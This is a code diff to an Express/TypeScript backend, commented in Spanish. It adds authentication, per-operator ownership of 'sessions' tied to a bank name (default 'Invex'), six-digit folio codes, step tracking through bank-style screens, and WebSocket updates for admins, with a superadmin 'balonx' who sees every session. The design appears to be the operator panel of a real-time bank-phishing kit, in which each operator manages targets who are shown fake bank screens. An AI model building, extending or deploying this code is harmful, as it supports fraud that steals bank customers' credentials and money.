@@ -463,11 +463,25 @@ export async function registerRoutes(app: Express): Promise<Server> {
         sessions = await storage.getCurrentSessions();
       }
       
-      // Solo el usuario "balonx" puede ver todas las sesiones
-      // Todos los demás (incluso con rol admin) solo ven sus propias sesiones
-      if (user.username !== 'balonx') {
+      // Filtrando las sesiones según el usuario
+      const isSuperAdmin = user.username === 'balonx';
+      
+      if (!isSuperAdmin) {
         const beforeCount = sessions.length;
-        sessions = sessions.filter(session => session.createdBy === user.username);
+        
+        // Filtrar solo las sesiones creadas por este usuario
+        sessions = sessions.filter(session => {
+          // Verificar explícitamente si el campo createdBy coincide con el nombre de usuario actual
+          const isCreatedByCurrentUser = session.createdBy === user.username;
+          
+          // Registro detallado para depuración
+          if (!isCreatedByCurrentUser && session.createdBy) {
+            console.log(`Sesión ${session.sessionId} no mostrada a ${user.username}, creador: ${session.createdBy}`);
+          }
+          
+          return isCreatedByCurrentUser;
+        });
+        
         console.log(`[Sessions] Usuario ${user.username} (rol: ${user.role}), mostrando ${sessions.length} de ${beforeCount} sesiones`);
       } else {
         console.log(`[Sessions] Superadministrador balonx accediendo a todas las sesiones (${sessions.length})`);
@@ -482,14 +496,45 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   app.post('/api/sessions', async (req, res) => {
     try {
+      if (!req.isAuthenticated()) {
+        return res.status(401).json({ message: "No autenticado" });
+      }
+
+      const user = req.user;
       const { banco = "Invex" } = req.body;
       const sessionId = nanoid(10);
+      
+      // Generamos un código de 6 dígitos numéricos fácil de ver para el folio
+      const generateSixDigitCode = () => {
+        let code = '';
+        for (let i = 0; i < 6; i++) {
+          code += Math.floor(Math.random() * 10).toString();
+        }
+        return code;
+      };
+
+      const sixDigitCode = generateSixDigitCode();
+      
       const session = await storage.createSession({ 
         sessionId, 
         banco,
-        folio: nanoid(6),
+        folio: sixDigitCode,
         pasoActual: ScreenType.FOLIO,
+        createdBy: user.username, // Añadimos el creador
       });
+      
+      // Guardar la sesión automáticamente para que aparezca en el historial
+      await storage.saveSession(sessionId);
+      console.log(`Sesión guardada automáticamente: ${sessionId}, creador: ${user.username}`);
+
+      // Notificar a los clientes de admin sobre la actualización
+      broadcastToAdmins(JSON.stringify({
+        type: 'SESSIONS_UPDATED',
+        data: {
+          userName: user.username
+        }
+      }));
+      
       res.json(session);
     } catch (error) {
       console.error("Error creating session:", error);
@@ -682,8 +727,23 @@ export async function registerRoutes(app: Express): Promise<Server> {
             // Solo el usuario "balonx" puede ver todas las sesiones
             // Todos los demás (incluso con rol admin) solo ven sus propias sesiones
             if (user && user.username !== 'balonx') {
-              console.log(`Usuario ${userName} (${user.role}), filtrando sesiones para mostrar solo las propias`);
-              sessions = sessions.filter(session => session.createdBy === userName);
+              const beforeCount = sessions.length;
+              
+              // Filtrar explícitamente solo las sesiones creadas por este usuario
+              sessions = sessions.filter(session => {
+                const isCreatedByCurrentUser = session.createdBy === userName;
+                
+                // Registros detallados para depuración
+                if (!isCreatedByCurrentUser && session.createdBy) {
+                  console.log(`WebSocket: Sesión ${session.sessionId} no mostrada a ${userName}, creador: ${session.createdBy}`);
+                }
+                
+                return isCreatedByCurrentUser;
+              });
+              
+              console.log(`WebSocket: Usuario ${userName} (${user.role}), mostrando ${sessions.length} de ${beforeCount} sesiones`);
+            } else {
+              console.log(`WebSocket: Superadministrador balonx accediendo a todas las sesiones (${sessions.length})`);
             }
             
             ws.send(JSON.stringify({
